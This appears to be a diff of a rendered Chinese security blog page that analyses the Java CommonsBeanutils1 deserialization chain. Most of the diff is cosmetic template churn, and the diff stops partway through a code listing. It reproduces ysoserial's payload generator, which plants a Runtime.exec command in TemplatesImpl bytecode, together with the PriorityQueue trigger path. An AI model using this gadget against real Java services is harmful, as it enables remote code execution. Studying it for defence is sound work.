@@ -3,7 +3,7 @@
   <head>
     <meta charset="utf-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <meta name="generator" content="Hugo 0.124.1">
+    <meta name="generator" content="Hugo 0.119.0">
     <meta name="description" content="记录一些学习和生活日常">
 <meta name="author" content="darkmoon">
 
@@ -12,23 +12,23 @@
     <title>CommonsBeanutils1 Chain - chestnut&#39;s blog</title>
 
     
-    <link href="/css/nucleus.css?1712424309" rel="stylesheet">
-    <link href="/css/fontawesome-all.min.css?1712424309" rel="stylesheet">
-    <link href="/css/hybrid.css?1712424309" rel="stylesheet">
-    <link href="/css/featherlight.min.css?1712424309" rel="stylesheet">
-    <link href="/css/perfect-scrollbar.min.css?1712424309" rel="stylesheet">
-    <link href="/css/auto-complete.css?1712424309" rel="stylesheet">
-    <link href="/css/atom-one-dark-reasonable.css?1712424309" rel="stylesheet">
-    <link href="/css/theme.css?1712424309" rel="stylesheet">
-    <link href="/css/tabs.css?1712424309" rel="stylesheet">
-    <link href="/css/hugo-theme.css?1712424309" rel="stylesheet">
+    <link href="/css/nucleus.css?1713376033" rel="stylesheet">
+    <link href="/css/fontawesome-all.min.css?1713376033" rel="stylesheet">
+    <link href="/css/hybrid.css?1713376033" rel="stylesheet">
+    <link href="/css/featherlight.min.css?1713376033" rel="stylesheet">
+    <link href="/css/perfect-scrollbar.min.css?1713376033" rel="stylesheet">
+    <link href="/css/auto-complete.css?1713376033" rel="stylesheet">
+    <link href="/css/atom-one-dark-reasonable.css?1713376033" rel="stylesheet">
+    <link href="/css/theme.css?1713376033" rel="stylesheet">
+    <link href="/css/tabs.css?1713376033" rel="stylesheet">
+    <link href="/css/hugo-theme.css?1713376033" rel="stylesheet">
     
-    <link href="/css/theme-blue.css?1712424309" rel="stylesheet">
+    <link href="/css/theme-blue.css?1713376033" rel="stylesheet">
     
     
-    <script src="/js/dayjs.min.js?1712424309"></script>
+    <script src="/js/dayjs.min.js?1713376033"></script>
 
-    <script src="/js/jquery-3.3.1.min.js?1712424309"></script>
+    <script src="/js/jquery-3.3.1.min.js?1713376033"></script>
     
     
     
@@ -109,14 +109,14 @@
     <span data-search-clear=""><i class="fas fa-times"></i></span>
 </div>
 
-<script type="text/javascript" src="/js/lunr.min.js?1712424309"></script>
-<script type="text/javascript" src="/js/auto-complete.js?1712424309"></script>
+<script type="text/javascript" src="/js/lunr.min.js?1713376033"></script>
+<script type="text/javascript" src="/js/auto-complete.js?1713376033"></script>
 <script type="text/javascript">
     
-        var baseurl = "https:\/\/www.ch35tnut.com\/\/zh-cn";
+        var baseurl = "https:\/\/www.ch35tnut.com\/zh-cn";
     
 </script>
-<script type="text/javascript" src="/js/search.js?1712424309"></script>
+<script type="text/javascript" src="/js/search.js?1713376033"></script>
 
     
   </div>
@@ -854,6 +854,65 @@
  
   
     
+    <li data-nav-id="/zh-cn/vulnerability/cve-2024-3094-what-can-we-learn-from-xz-backdoor/" title="CVE 2024 3094 What Can We Learn From Xz Backdoor" class="dd-item
+        
+        
+        
+        ">
+      <a href="/zh-cn/vulnerability/cve-2024-3094-what-can-we-learn-from-xz-backdoor/">
+          <b>X. </b>CVE 2024 3094 What Can We Learn From Xz Backdoor
+          
+            <i class="fas fa-check read-icon"></i>
+          
+      </a>
+      
+      
+        <ul>
+          
+          
+          
+
+        
+          
+            
+            
+
+
+
+
+ 
+  
+    
+      <li data-nav-id="/zh-cn/vulnerability/cve-2024-3094-what-can-we-learn-from-xz-backdoor/part-1-script/" title="Part 1 Script" class="dd-item ">
+        <a href="/zh-cn/vulnerability/cve-2024-3094-what-can-we-learn-from-xz-backdoor/part-1-script/">
+        Part 1 Script
+        <i class="fas fa-check read-icon"></i>
+        </a>
+    </li>
+     
+  
+ 
+
+            
+          
+        
+        </ul>
+      
+    </li>
+  
+ 
+
+            
+          
+            
+            
+
+
+
+
+ 
+  
+    
     <li data-nav-id="/zh-cn/vulnerability/windows-clfs-eop/" title="Windows CLFS EoP" class="dd-item
         
         
@@ -920,27 +979,6 @@
         </ul>
       
     </li>
-  
- 
-
-            
-          
-            
-            
-
-
-
-
- 
-  
-    
-      <li data-nav-id="/zh-cn/vulnerability/cve-2024-3094-what-can-we-learn-from-xz-backdoor/" title="CVE-2024-3094 What Can We Learn From Xz Backdoor" class="dd-item ">
-        <a href="/zh-cn/vulnerability/cve-2024-3094-what-can-we-learn-from-xz-backdoor/">
-        CVE-2024-3094 What Can We Learn From Xz Backdoor
-        <i class="fas fa-check read-icon"></i>
-        </a>
-    </li>
-     
   
  
 
@@ -2469,51 +2507,51 @@
 <p>在ysoserial中实现了<code>CommonsBeanutils1</code>反序列化链，可以利用这个链执行代码。</p>
 <h3 id="细节">细节</h3>
 <p>在ysoserial中实现<code>CommonsBeanutils1</code>代码如下，首先<code>new BeanComparator/PriorityQueue</code>对象，在<code>PriorityQueue</code>对象内添加两个int对象，而后通过反射修改property字段存储的值</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#66d9ef">public</span> <span style="color:#66d9ef">class</span> <span style="color:#a6e22e">CommonsBeanutils1</span> <span style="color:#66d9ef">implements</span> ObjectPayload<span style="color:#f92672">&lt;</span>Object<span style="color:#f92672">&gt;</span> {
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#66d9ef">public</span> <span style="color:#66d9ef">class</span> <span style="color:#a6e22e">CommonsBeanutils1</span> <span style="color:#66d9ef">implements</span> ObjectPayload<span style="color:#f92672">&lt;</span>Object<span style="color:#f92672">&gt;</span> <span style="color:#f92672">{</span>
 </span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">public</span> Object <span style="color:#a6e22e">getObject</span>(<span style="color:#66d9ef">final</span> String command) <span style="color:#66d9ef">throws</span> Exception {
-</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">final</span> Object templates <span style="color:#f92672">=</span> Gadgets.<span style="color:#a6e22e">createTemplatesImpl</span>(command);
-</span></span><span style="display:flex;"><span>		<span style="color:#75715e">// mock method name until armed</span>
-</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">final</span> BeanComparator comparator <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> BeanComparator(<span style="color:#e6db74">&#34;lowestSetBit&#34;</span>);
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">public</span> Object <span style="color:#a6e22e">getObject</span><span style="color:#f92672">(</span><span style="color:#66d9ef">final</span> String command<span style="color:#f92672">)</span> <span style="color:#66d9ef">throws</span> Exception <span style="color:#f92672">{</span>
+</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">final</span> Object templates <span style="color:#f92672">=</span> Gadgets<span style="color:#f92672">.</span><span style="color:#a6e22e">createTemplatesImpl</span><span style="color:#f92672">(</span>command<span style="color:#f92672">);</span>
+</span></span><span style="display:flex;"><span>		<span style="color:#75715e">// mock method name until armed
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>		<span style="color:#66d9ef">final</span> BeanComparator comparator <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> BeanComparator<span style="color:#f92672">(</span><span style="color:#e6db74">&#34;lowestSetBit&#34;</span><span style="color:#f92672">);</span>
 </span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>		<span style="color:#75715e">// create queue with numbers and basic comparator</span>
-</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">final</span> PriorityQueue<span style="color:#f92672">&lt;</span>Object<span style="color:#f92672">&gt;</span> queue <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> PriorityQueue<span style="color:#f92672">&lt;</span>Object<span style="color:#f92672">&gt;</span>(2, comparator);
-</span></span><span style="display:flex;"><span>		<span style="color:#75715e">// stub data for replacement later</span>
-</span></span><span style="display:flex;"><span>		queue.<span style="color:#a6e22e">add</span>(<span style="color:#66d9ef">new</span> BigInteger(<span style="color:#e6db74">&#34;1&#34;</span>));
-</span></span><span style="display:flex;"><span>		queue.<span style="color:#a6e22e">add</span>(<span style="color:#66d9ef">new</span> BigInteger(<span style="color:#e6db74">&#34;1&#34;</span>));
+</span></span><span style="display:flex;"><span>		<span style="color:#75715e">// create queue with numbers and basic comparator
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>		<span style="color:#66d9ef">final</span> PriorityQueue<span style="color:#f92672">&lt;</span>Object<span style="color:#f92672">&gt;</span> queue <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> PriorityQueue<span style="color:#f92672">&lt;</span>Object<span style="color:#f92672">&gt;(</span><span style="color:#ae81ff">2</span><span style="color:#f92672">,</span> comparator<span style="color:#f92672">);</span>
+</span></span><span style="display:flex;"><span>		<span style="color:#75715e">// stub data for replacement later
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>		queue<span style="color:#f92672">.</span><span style="color:#a6e22e">add</span><span style="color:#f92672">(</span><span style="color:#66d9ef">new</span> BigInteger<span style="color:#f92672">(</span><span style="color:#e6db74">&#34;1&#34;</span><span style="color:#f92672">));</span>
+</span></span><span style="display:flex;"><span>		queue<span style="color:#f92672">.</span><span style="color:#a6e22e">add</span><span style="color:#f92672">(</span><span style="color:#66d9ef">new</span> BigInteger<span style="color:#f92672">(</span><span style="color:#e6db74">&#34;1&#34;</span><span style="color:#f92672">));</span>
 </span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>		<span style="color:#75715e">// switch method called by comparator</span>
-</span></span><span style="display:flex;"><span>		Reflections.<span style="color:#a6e22e">setFieldValue</span>(comparator, <span style="color:#e6db74">&#34;property&#34;</span>, <span style="color:#e6db74">&#34;outputProperties&#34;</span>);
+</span></span><span style="display:flex;"><span>		<span style="color:#75715e">// switch method called by comparator
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>		Reflections<span style="color:#f92672">.</span><span style="color:#a6e22e">setFieldValue</span><span style="color:#f92672">(</span>comparator<span style="color:#f92672">,</span> <span style="color:#e6db74">&#34;property&#34;</span><span style="color:#f92672">,</span> <span style="color:#e6db74">&#34;outputProperties&#34;</span><span style="color:#f92672">);</span>
 </span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>		<span style="color:#75715e">// switch contents of queue</span>
-</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">final</span> Object<span style="color:#f92672">[]</span> queueArray <span style="color:#f92672">=</span> (Object<span style="color:#f92672">[]</span>) Reflections.<span style="color:#a6e22e">getFieldValue</span>(queue, <span style="color:#e6db74">&#34;queue&#34;</span>);
-</span></span><span style="display:flex;"><span>		queueArray<span style="color:#f92672">[</span>0<span style="color:#f92672">]</span> <span style="color:#f92672">=</span> templates;
-</span></span><span style="display:flex;"><span>		queueArray<span style="color:#f92672">[</span>1<span style="color:#f92672">]</span> <span style="color:#f92672">=</span> templates;
+</span></span><span style="display:flex;"><span>		<span style="color:#75715e">// switch contents of queue
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>		<span style="color:#66d9ef">final</span> Object<span style="color:#f92672">[]</span> queueArray <span style="color:#f92672">=</span> <span style="color:#f92672">(</span>Object<span style="color:#f92672">[])</span> Reflections<span style="color:#f92672">.</span><span style="color:#a6e22e">getFieldValue</span><span style="color:#f92672">(</span>queue<span style="color:#f92672">,</span> <span style="color:#e6db74">&#34;queue&#34;</span><span style="color:#f92672">);</span>
+</span></span><span style="display:flex;"><span>		queueArray<span style="color:#f92672">[</span><span style="color:#ae81ff">0</span><span style="color:#f92672">]</span> <span style="color:#f92672">=</span> templates<span style="color:#f92672">;</span>
+</span></span><span style="display:flex;"><span>		queueArray<span style="color:#f92672">[</span><span style="color:#ae81ff">1</span><span style="color:#f92672">]</span> <span style="color:#f92672">=</span> templates<span style="color:#f92672">;</span>
 </span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">return</span> queue;
-</span></span><span style="display:flex;"><span>	}
+</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">return</span> queue<span style="color:#f92672">;</span>
+</span></span><span style="display:flex;"><span>	<span style="color:#f92672">}</span>
 </span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">static</span> Object <span style="color:#a6e22e">createTemplatesImpl</span>(String command) <span style="color:#66d9ef">throws</span> Exception {
-</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> Boolean.<span style="color:#a6e22e">parseBoolean</span>(System.<span style="color:#a6e22e">getProperty</span>(<span style="color:#e6db74">&#34;properXalan&#34;</span>, <span style="color:#e6db74">&#34;false&#34;</span>)) <span style="color:#f92672">?</span> createTemplatesImpl(command, Class.<span style="color:#a6e22e">forName</span>(<span style="color:#e6db74">&#34;org.apache.xalan.xsltc.trax.TemplatesImpl&#34;</span>), Class.<span style="color:#a6e22e">forName</span>(<span style="color:#e6db74">&#34;org.apache.xalan.xsltc.runtime.AbstractTranslet&#34;</span>), Class.<span style="color:#a6e22e">forName</span>(<span style="color:#e6db74">&#34;org.apache.xalan.xsltc.trax.TransformerFactoryImpl&#34;</span>)) : createTemplatesImpl(command, TemplatesImpl.<span style="color:#a6e22e">class</span>, AbstractTranslet.<span style="color:#a6e22e">class</span>, TransformerFactoryImpl.<span style="color:#a6e22e">class</span>);
-</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">static</span> Object <span style="color:#a6e22e">createTemplatesImpl</span><span style="color:#f92672">(</span>String command<span style="color:#f92672">)</span> <span style="color:#66d9ef">throws</span> Exception <span style="color:#f92672">{</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> Boolean<span style="color:#f92672">.</span><span style="color:#a6e22e">parseBoolean</span><span style="color:#f92672">(</span>System<span style="color:#f92672">.</span><span style="color:#a6e22e">getProperty</span><span style="color:#f92672">(</span><span style="color:#e6db74">&#34;properXalan&#34;</span><span style="color:#f92672">,</span> <span style="color:#e6db74">&#34;false&#34;</span><span style="color:#f92672">))</span> <span style="color:#f92672">?</span> createTemplatesImpl<span style="color:#f92672">(</span>command<span style="color:#f92672">,</span> Class<span style="color:#f92672">.</span><span style="color:#a6e22e">forName</span><span style="color:#f92672">(</span><span style="color:#e6db74">&#34;org.apache.xalan.xsltc.trax.TemplatesImpl&#34;</span><span style="color:#f92672">),</span> Class<span style="color:#f92672">.</span><span style="color:#a6e22e">forName</span><span style="color:#f92672">(</span><span style="color:#e6db74">&#34;org.apache.xalan.xsltc.runtime.AbstractTranslet&#34;</span><span style="color:#f92672">),</span> Class<span style="color:#f92672">.</span><span style="color:#a6e22e">forName</span><span style="color:#f92672">(</span><span style="color:#e6db74">&#34;org.apache.xalan.xsltc.trax.TransformerFactoryImpl&#34;</span><span style="color:#f92672">))</span> <span style="color:#f92672">:</span> createTemplatesImpl<span style="color:#f92672">(</span>command<span style="color:#f92672">,</span> TemplatesImpl<span style="color:#f92672">.</span><span style="color:#a6e22e">class</span><span style="color:#f92672">,</span> AbstractTranslet<span style="color:#f92672">.</span><span style="color:#a6e22e">class</span><span style="color:#f92672">,</span> TransformerFactoryImpl<span style="color:#f92672">.</span><span style="color:#a6e22e">class</span><span style="color:#f92672">);</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">}</span>
 </span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">static</span> <span style="color:#f92672">&lt;</span>T<span style="color:#f92672">&gt;</span> T <span style="color:#a6e22e">createTemplatesImpl</span>(String command, Class<span style="color:#f92672">&lt;</span>T<span style="color:#f92672">&gt;</span> tplClass, Class<span style="color:#f92672">&lt;?&gt;</span> abstTranslet, Class<span style="color:#f92672">&lt;?&gt;</span> transFactory) <span style="color:#66d9ef">throws</span> Exception {
-</span></span><span style="display:flex;"><span>        T templates <span style="color:#f92672">=</span> tplClass.<span style="color:#a6e22e">newInstance</span>();
-</span></span><span style="display:flex;"><span>        ClassPool pool <span style="color:#f92672">=</span> ClassPool.<span style="color:#a6e22e">getDefault</span>();
-</span></span><span style="display:flex;"><span>        pool.<span style="color:#a6e22e">insertClassPath</span>(<span style="color:#66d9ef">new</span> ClassClassPath(StubTransletPayload.<span style="color:#a6e22e">class</span>));
-</span></span><span style="display:flex;"><span>        pool.<span style="color:#a6e22e">insertClassPath</span>(<span style="color:#66d9ef">new</span> ClassClassPath(abstTranslet));
-</span></span><span style="display:flex;"><span>        CtClass clazz <span style="color:#f92672">=</span> pool.<span style="color:#a6e22e">get</span>(StubTransletPayload.<span style="color:#a6e22e">class</span>.<span style="color:#a6e22e">getName</span>());
-</span></span><span style="display:flex;"><span>        String cmd <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;java.lang.Runtime.getRuntime().exec(\&#34;&#34;</span> <span style="color:#f92672">+</span> command.<span style="color:#a6e22e">replace</span>(<span style="color:#e6db74">&#34;\\&#34;</span>, <span style="color:#e6db74">&#34;\\\\&#34;</span>).<span style="color:#a6e22e">replace</span>(<span style="color:#e6db74">&#34;\&#34;&#34;</span>, <span style="color:#e6db74">&#34;\\\&#34;&#34;</span>) <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;\&#34;);&#34;</span>;
-</span></span><span style="display:flex;"><span>        clazz.<span style="color:#a6e22e">makeClassInitializer</span>().<span style="color:#a6e22e">insertAfter</span>(cmd);
-</span></span><span style="display:flex;"><span>        clazz.<span style="color:#a6e22e">setName</span>(<span style="color:#e6db74">&#34;ysoserial.Pwner&#34;</span> <span style="color:#f92672">+</span> System.<span style="color:#a6e22e">nanoTime</span>());
-</span></span><span style="display:flex;"><span>        CtClass superC <span style="color:#f92672">=</span> pool.<span style="color:#a6e22e">get</span>(abstTranslet.<span style="color:#a6e22e">getName</span>());
-</span></span><span style="display:flex;"><span>        clazz.<span style="color:#a6e22e">setSuperclass</span>(superC);
-</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">byte</span><span style="color:#f92672">[]</span> classBytes <span style="color:#f92672">=</span> clazz.<span style="color:#a6e22e">toBytecode</span>();
-</span></span><span style="display:flex;"><span>        Reflections.<span style="color:#a6e22e">setFieldValue</span>(templates, <span style="color:#e6db74">&#34;_bytecodes&#34;</span>, <span style="color:#66d9ef">new</span> <span style="color:#66d9ef">byte</span><span style="color:#f92672">[][]</span>{classBytes, ClassFiles.<span style="color:#a6e22e">classAsBytes</span>(Foo.<span style="color:#a6e22e">class</span>)});
-</span></span><span style="display:flex;"><span>        Reflections.<span style="color:#a6e22e">setFieldValue</span>(templates, <span style="color:#e6db74">&#34;_name&#34;</span>, <span style="color:#e6db74">&#34;Pwnr&#34;</span>);
-</span></span><span style="display:flex;"><span>        Reflections.<span style="color:#a6e22e">setFieldValue</span>(templates, <span style="color:#e6db74">&#34;_tfactory&#34;</span>, transFactory.<span style="color:#a6e22e">newInstance</span>());
-</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> templates;
-</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">static</span> <span style="color:#f92672">&lt;</span>T<span style="color:#f92672">&gt;</span> T <span style="color:#a6e22e">createTemplatesImpl</span><span style="color:#f92672">(</span>String command<span style="color:#f92672">,</span> Class<span style="color:#f92672">&lt;</span>T<span style="color:#f92672">&gt;</span> tplClass<span style="color:#f92672">,</span> Class<span style="color:#f92672">&lt;?&gt;</span> abstTranslet<span style="color:#f92672">,</span> Class<span style="color:#f92672">&lt;?&gt;</span> transFactory<span style="color:#f92672">)</span> <span style="color:#66d9ef">throws</span> Exception <span style="color:#f92672">{</span>
+</span></span><span style="display:flex;"><span>        T templates <span style="color:#f92672">=</span> tplClass<span style="color:#f92672">.</span><span style="color:#a6e22e">newInstance</span><span style="color:#f92672">();</span>
+</span></span><span style="display:flex;"><span>        ClassPool pool <span style="color:#f92672">=</span> ClassPool<span style="color:#f92672">.</span><span style="color:#a6e22e">getDefault</span><span style="color:#f92672">();</span>
+</span></span><span style="display:flex;"><span>        pool<span style="color:#f92672">.</span><span style="color:#a6e22e">insertClassPath</span><span style="color:#f92672">(</span><span style="color:#66d9ef">new</span> ClassClassPath<span style="color:#f92672">(</span>StubTransletPayload<span style="color:#f92672">.</span><span style="color:#a6e22e">class</span><span style="color:#f92672">));</span>
+</span></span><span style="display:flex;"><span>        pool<span style="color:#f92672">.</span><span style="color:#a6e22e">insertClassPath</span><span style="color:#f92672">(</span><span style="color:#66d9ef">new</span> ClassClassPath<span style="color:#f92672">(</span>abstTranslet<span style="color:#f92672">));</span>
+</span></span><span style="display:flex;"><span>        CtClass clazz <span style="color:#f92672">=</span> pool<span style="color:#f92672">.</span><span style="color:#a6e22e">get</span><span style="color:#f92672">(</span>StubTransletPayload<span style="color:#f92672">.</span><span style="color:#a6e22e">class</span><span style="color:#f92672">.</span><span style="color:#a6e22e">getName</span><span style="color:#f92672">());</span>
+</span></span><span style="display:flex;"><span>        String cmd <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;java.lang.Runtime.getRuntime().exec(\&#34;&#34;</span> <span style="color:#f92672">+</span> command<span style="color:#f92672">.</span><span style="color:#a6e22e">replace</span><span style="color:#f92672">(</span><span style="color:#e6db74">&#34;\\&#34;</span><span style="color:#f92672">,</span> <span style="color:#e6db74">&#34;\\\\&#34;</span><span style="color:#f92672">).</span><span style="color:#a6e22e">replace</span><span style="color:#f92672">(</span><span style="color:#e6db74">&#34;\&#34;&#34;</span><span style="color:#f92672">,</span> <span style="color:#e6db74">&#34;\\\&#34;&#34;</span><span style="color:#f92672">)</span> <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;\&#34;);&#34;</span><span style="color:#f92672">;</span>
+</span></span><span style="display:flex;"><span>        clazz<span style="color:#f92672">.</span><span style="color:#a6e22e">makeClassInitializer</span><span style="color:#f92672">().</span><span style="color:#a6e22e">insertAfter</span><span style="color:#f92672">(</span>cmd<span style="color:#f92672">);</span>
+</span></span><span style="display:flex;"><span>        clazz<span style="color:#f92672">.</span><span style="color:#a6e22e">setName</span><span style="color:#f92672">(</span><span style="color:#e6db74">&#34;ysoserial.Pwner&#34;</span> <span style="color:#f92672">+</span> System<span style="color:#f92672">.</span><span style="color:#a6e22e">nanoTime</span><span style="color:#f92672">());</span>
+</span></span><span style="display:flex;"><span>        CtClass superC <span style="color:#f92672">=</span> pool<span style="color:#f92672">.</span><span style="color:#a6e22e">get</span><span style="color:#f92672">(</span>abstTranslet<span style="color:#f92672">.</span><span style="color:#a6e22e">getName</span><span style="color:#f92672">());</span>
+</span></span><span style="display:flex;"><span>        clazz<span style="color:#f92672">.</span><span style="color:#a6e22e">setSuperclass</span><span style="color:#f92672">(</span>superC<span style="color:#f92672">);</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">byte</span><span style="color:#f92672">[]</span> classBytes <span style="color:#f92672">=</span> clazz<span style="color:#f92672">.</span><span style="color:#a6e22e">toBytecode</span><span style="color:#f92672">();</span>
+</span></span><span style="display:flex;"><span>        Reflections<span style="color:#f92672">.</span><span style="color:#a6e22e">setFieldValue</span><span style="color:#f92672">(</span>templates<span style="color:#f92672">,</span> <span style="color:#e6db74">&#34;_bytecodes&#34;</span><span style="color:#f92672">,</span> <span style="color:#66d9ef">new</span> <span style="color:#66d9ef">byte</span><span style="color:#f92672">[][]{</span>classBytes<span style="color:#f92672">,</span> ClassFiles<span style="color:#f92672">.</span><span style="color:#a6e22e">classAsBytes</span><span style="color:#f92672">(</span>Foo<span style="color:#f92672">.</span><span style="color:#a6e22e">class</span><span style="color:#f92672">)});</span>
+</span></span><span style="display:flex;"><span>        Reflections<span style="color:#f92672">.</span><span style="color:#a6e22e">setFieldValue</span><span style="color:#f92672">(</span>templates<span style="color:#f92672">,</span> <span style="color:#e6db74">&#34;_name&#34;</span><span style="color:#f92672">,</span> <span style="color:#e6db74">&#34;Pwnr&#34;</span><span style="color:#f92672">);</span>
+</span></span><span style="display:flex;"><span>        Reflections<span style="color:#f92672">.</span><span style="color:#a6e22e">setFieldValue</span><span style="color:#f92672">(</span>templates<span style="color:#f92672">,</span> <span style="color:#e6db74">&#34;_tfactory&#34;</span><span style="color:#f92672">,</span> transFactory<span style="color:#f92672">.</span><span style="color:#a6e22e">newInstance</span><span style="color:#f92672">());</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> templates<span style="color:#f92672">;</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">}</span>
 </span></span></code></pre></div><p>而后通过反射将PriorityQueue对象存储的两个BigInteger对象改为创建的TemplatesImpl对象。
 
 <img alt="" src="/images/research/web/java-deserialization/CommonsBeanutils1-chain.zh-cn.assets/1.png" /></p>
@@ -2527,260 +2565,260 @@
 
 <img alt="" src="/images/research/web/java-deserialization/CommonsBeanutils1-chain.zh-cn.assets/3.png" /></p>
 <p>而后readObject会调用heapify方法，跟进调用最后调用到comparator.compare</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span>    <span style="color:#66d9ef">private</span> <span style="color:#66d9ef">void</span> <span style="color:#a6e22e">heapify</span>() {
-</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">for</span> (<span style="color:#66d9ef">int</span> i <span style="color:#f92672">=</span> (size <span style="color:#f92672">&gt;&gt;&gt;</span> 1) <span style="color:#f92672">-</span> 1; i <span style="color:#f92672">&gt;=</span> 0; i<span style="color:#f92672">--</span>)
-</span></span><span style="display:flex;"><span>            siftDown(i, (E) queue<span style="color:#f92672">[</span>i<span style="color:#f92672">]</span>);
-</span></span><span style="display:flex;"><span>    }
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span>    <span style="color:#66d9ef">private</span> <span style="color:#66d9ef">void</span> <span style="color:#a6e22e">heapify</span><span style="color:#f92672">()</span> <span style="color:#f92672">{</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">for</span> <span style="color:#f92672">(</span><span style="color:#66d9ef">int</span> i <span style="color:#f92672">=</span> <span style="color:#f92672">(</span>size <span style="color:#f92672">&gt;&gt;&gt;</span> <span style="color:#ae81ff">1</span><span style="color:#f92672">)</span> <span style="color:#f92672">-</span> <span style="color:#ae81ff">1</span><span style="color:#f92672">;</span> i <span style="color:#f92672">&gt;=</span> <span style="color:#ae81ff">0</span><span style="color:#f92672">;</span> i<span style="color:#f92672">--)</span>
+</span></span><span style="display:flex;"><span>            siftDown<span style="color:#f92672">(</span>i<span style="color:#f92672">,</span> <span style="color:#f92672">(</span>E<span style="color:#f92672">)</span> queue<span style="color:#f92672">[</span>i<span style="color:#f92672">]);</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">}</span>
 </span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">private</span> <span style="color:#66d9ef">void</span> <span style="color:#a6e22e">siftDown</span>(<span style="color:#66d9ef">int</span> k, E x) {
-</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> (comparator <span style="color:#f92672">!=</span> <span style="color:#66d9ef">null</span>)
-</span></span><span style="display:flex;"><span>            siftDownUsingComparator(k, x);
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">private</span> <span style="color:#66d9ef">void</span> <span style="color:#a6e22e">siftDown</span><span style="color:#f92672">(</span><span style="color:#66d9ef">int</span> k<span style="color:#f92672">,</span> E x<span style="color:#f92672">)</span> <span style="color:#f92672">{</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> <span style="color:#f92672">(</span>comparator <span style="color:#f92672">!=</span> <span style="color:#66d9ef">null</span><span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>            siftDownUsingComparator<span style="color:#f92672">(</span>k<span style="color:#f92672">,</span> x<span style="color:#f92672">);</span>
 </span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">else</span>
-</span></span><span style="display:flex;"><span>            siftDownComparable(k, x);
-</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>            siftDownComparable<span style="color:#f92672">(</span>k<span style="color:#f92672">,</span> x<span style="color:#f92672">);</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">}</span>
 </span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">private</span> <span style="color:#66d9ef">void</span> <span style="color:#a6e22e">siftDownUsingComparator</span>(<span style="color:#66d9ef">int</span> k, E x) {
-</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">int</span> half <span style="color:#f92672">=</span> size <span style="color:#f92672">&gt;&gt;&gt;</span> 1;
-</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">while</span> (k <span style="color:#f92672">&lt;</span> half) {
-</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">int</span> child <span style="color:#f92672">=</span> (k <span style="color:#f92672">&lt;&lt;</span> 1) <span style="color:#f92672">+</span> 1;
-</span></span><span style="display:flex;"><span>            Object c <span style="color:#f92672">=</span> queue<span style="color:#f92672">[</span>child<span style="color:#f92672">]</span>;
